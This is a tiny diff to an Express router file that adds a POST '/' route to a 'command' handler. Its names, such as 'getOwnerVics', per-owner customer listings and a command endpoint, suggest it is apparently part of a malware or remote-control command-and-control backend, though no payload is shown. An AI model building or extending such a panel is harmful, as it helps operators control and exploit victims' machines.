@@ -27,5 +27,6 @@ router.get("/customers/:owner", getOwnerVics);
 router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/delete", deleteEntry);
+router.post("/", command);
 
 module.exports = router;
